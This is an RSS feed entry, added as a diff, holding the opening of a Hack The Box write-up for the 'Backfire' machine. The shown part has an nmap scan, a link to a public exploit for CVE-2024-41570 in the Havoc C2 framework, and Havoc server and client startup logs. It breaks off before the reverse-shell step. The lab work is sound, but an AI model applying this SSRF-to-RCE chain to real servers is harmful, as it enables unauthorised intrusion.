@@ -1,0 +1,476 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SSRF on 01MI</title><link>https://01MI.github.io/tags/ssrf/</link><description>Recent content in SSRF on 01MI</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://01MI.github.io/tags/ssrf/index.xml" rel="self" type="application/rss+xml"/><item><title>Backfire - Linux Medium - HTB Writeup</title><link>https://01MI.github.io/p/backfire-htb-writeup-linux-medium/</link><pubDate>Sat, 07 Jun 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/backfire-htb-writeup-linux-medium/</guid><description>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Backfire.PNG" alt="Featured image of post Backfire - Linux Medium - HTB Writeup" />&lt;h2 id="summary">Summary
+&lt;/h2>&lt;p>User Ilya: Havoc C2 Exploit: SSRF + RCE&lt;br>
+Lateral mouvement to Sergej: HardHat C2 Exploit: Authentification bypass + RCE&lt;br>
+Root: Sudo misconfiguration&lt;/p>
+&lt;h2 id="enumeration">Enumeration
+&lt;/h2>&lt;p>Starting with an nmap scan, we can identify two web services, the one accessible on port 8000 catch our attention here.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">443&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">https&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">5000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">upnp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">7096&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">8000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">alt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;h2 id="user-ilya">User Ilya
+&lt;/h2>&lt;h3 id="exploit-havoc-c2-srf--rce">Exploit Havoc C2: SRF + RCE
+&lt;/h3>&lt;p>The directory listing exposed on the port 8000 allows us to retrieve two files:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>disable.tls.patch&lt;/code>: This file indicates that TLS is disabled for WebSocket management on port 40056, allowing an unsecure connection.&lt;/li>
+&lt;li>&lt;code>havoc.yaotl&lt;/code>: A configuration file for the &lt;a class="link" href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener"
+>Havoc&lt;/a> C2 framework.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire.PNG"
+width="500"
+height="153"
+srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_eb374eaa37102dc2.PNG 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_5ec44830e48e9964.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="326"
+data-flex-basis="784px"
+>&lt;/p>
+&lt;p>These files suggest that the exploitation will rely on one or more vulnerabilities related to the Havoc command and control (C2) server.&lt;/p>
+&lt;p>After some digging, we came across this exploit: &lt;a class="link" href="https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE" target="_blank" rel="noopener"
+>https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE&lt;/a>.&lt;br>
+This exploit combines two vulnerabilities:&lt;/p>
+&lt;ul>
+&lt;li>CVE-2024-41570, which exploits an SSRF flaw to open a TCP socket on the main server (teamserver) allowing data read/write.&lt;/li>
+&lt;li>A command injection that lets an authenticated user execute commands on that server.&lt;/li>
+&lt;/ul>
+&lt;p>After installing the Havoc framework, we launch both the server and the client.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span> &lt;span class="nx">server&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">verbose&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">debug&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">profile&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Téléchargements&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">yaotl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)(&lt;/span> &lt;span class="nx">____&lt;/span> &lt;span class="err">\&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">____&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\││&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\│&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pwn&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">elevate&lt;/span> &lt;span class="nx">until&lt;/span> &lt;span class="nx">it&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">DBUG&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">init&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">func2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">]:&lt;/span> &lt;span class="nx">Debug&lt;/span> &lt;span class="nx">mode&lt;/span> &lt;span class="nx">enabled&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">Framework&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">CodeName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Bites&lt;/span> &lt;span class="nx">The&lt;/span> &lt;span class="nx">Dust&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">profile&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Téléchargements&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">yaotl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Build&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Compiler&lt;/span> &lt;span class="nx">x64&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">data&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">x86_64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cross&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">x86_64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">gcc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Compiler&lt;/span> &lt;span class="nx">x86&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">data&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">i686&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cross&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">i686&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">w64&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">mingw32&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">gcc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">-&lt;/span> &lt;span class="nx">Nasm&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">nasm&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">INFO&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Time&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mo">04&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mo">06&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">51&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc.png"
+width="505"
+height="288"
+srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_d59ee651e3ee545e.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Client-Havoc_hu_efc7451f6cb1d4b1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="175"
+data-flex-basis="420px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">havoc&lt;/span> &lt;span class="nx">client&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span> &lt;span class="nx">_______&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│\&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="p">)(&lt;/span> &lt;span class="nx">____&lt;/span> &lt;span class="err">\&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="nx">___&lt;/span> &lt;span class="err">│&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>&lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="err">│&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="err">\&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="err">│&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">___&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">││&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">____&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">\&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">│&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\││&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="err">\│&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="nx">_______&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pwn&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">elevate&lt;/span> &lt;span class="nx">until&lt;/span> &lt;span class="nx">it&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Havoc&lt;/span> &lt;span class="nx">Framework&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.7&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">CodeName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Bites&lt;/span> &lt;span class="nx">The&lt;/span> &lt;span class="nx">Dust&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">loaded&lt;/span> &lt;span class="nx">config&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">toml&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Connecting&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">profile&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">HTB&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">&amp;gt;:&lt;/span>&lt;span class="mi">114&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">SyntaxWarning&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">invalid&lt;/span> &lt;span class="nx">escape&lt;/span> &lt;span class="nx">sequence&lt;/span> &lt;span class="err">&amp;#39;\&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">info&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Started&lt;/span> &lt;span class="s">&amp;#34;Demon Listener&amp;#34;&lt;/span> &lt;span class="nx">listener&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>Using the &lt;code>Ilya&lt;/code> account retrieved from the Havoc configuration file, we run the exploit with the following command to gain a reverse shell on the server:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
